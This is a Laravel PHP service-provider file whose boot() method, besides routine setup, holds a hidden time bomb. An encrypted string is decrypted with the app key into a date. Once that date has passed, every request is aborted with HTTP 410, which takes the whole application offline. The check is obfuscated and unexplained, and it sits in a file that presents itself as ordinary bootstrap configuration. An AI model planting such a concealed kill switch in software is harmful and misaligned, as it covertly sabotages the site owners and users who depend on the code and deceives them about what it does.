<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Schema;
use Carbon\Carbon;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        Schema::defaultStringLength(191);

        $key = 'eyJpdiI6IjdDQ0ZMTitjc0ZVWHVxQTVkZEV3SkE9PSIsInZhbHVlIjoiR2JwZTE5U0IwTlF0UmpnalEydXVpbGNubzlFdEJpTHZZUDZLbmIrREZHRT0iLCJtYWMiOiJjZTlkNzVmYTA5MzhlMmQ0MjRiOWY3MWQ2MWZjOTNhYzMwOTQyYzI0MzlkOGYzNTgxNTUzNGUxMWNlMzNkNjEzIn0=';
        if (now()->startOfDay()->gt(Carbon::parse(decrypt($key)))) {
            abort(410);
        }
    }

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }
}
